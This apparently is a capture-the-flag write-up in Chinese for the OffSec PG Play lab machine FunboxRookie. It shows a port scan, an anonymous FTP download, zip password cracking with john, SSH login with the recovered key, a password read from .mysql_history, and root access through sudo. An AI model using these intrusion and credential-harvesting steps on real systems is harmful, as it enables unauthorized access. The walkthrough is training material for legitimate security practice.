###### tags: `Offsec` `PG Play` `Easy` `Linux`

# FunboxRookie
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.215.107 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.215.107:21
Open 192.168.215.107:22
Open 192.168.215.107:80

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/logs/
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

利用ftp登入，我是看到`tom.zip`的權限跟其他檔案不一樣，下載tom.zip，用john爆破得密碼`iubire`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ftp 192.168.215.107
ftp> get tom.zip

┌──(kali㉿kali)-[~/pgplay/FunboxRookie]
└─$ john tom.txt --wordlist=/home/kali/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iubire           (tom.zip/id_rsa)
```

解壓縮檔案之後得`id_rsa`，利用`tom`跟`id_rsa`檔ssh登入，在`/home/tom`得到local.txt
```
┌──(kali㉿kali)-[~/pgplay/FunboxRookie]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/pgplay/FunboxRookie]
└─$ ssh -i id_rsa tom@192.168.215.107

tom@funbox2:~$ cat local.txt
9abd82872410457a53384d6a60634776
```

發現有一個`.mysql_history`檔案，可以猜想tom的密碼為`xx11yy22!`
```
tom@funbox2:~$ ls -al
total 40
drwxr-xr-x 5 tom  tom  4096 Mar 19 03:09 .
drwxr-xr-x 3 root root 4096 Jul 25  2020 ..
-rw------- 1 tom  tom     0 Oct 14  2020 .bash_history
-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc
drwx------ 2 tom  tom  4096 Mar 19 03:09 .cache
drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg
-rw-r--r-- 1 tom  tom    33 Mar 19 02:53 local.txt
-rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
drwx------ 2 tom  tom  4096 Jul 25  2020 .ssh

tom@funbox2:~$ cat .mysql_history
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
```

使用`sudo -l`搭配密碼`xx11yy22!`，發現所有指令都能使用，直接`sudo su`在`/root`路徑得到proof.txt
```
tom@funbox2:~$ sudo -l
[sudo] password for tom: xx11yy22!
Matching Defaults entries for tom on funbox2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL

tom@funbox2:~$ sudo su
root@funbox2:/home/tom# 
root@funbox2:/home/tom# cd /root
root@funbox2:~# cat proof.txt
ea021aa27f2ffbb28f7c4412f33b6250
```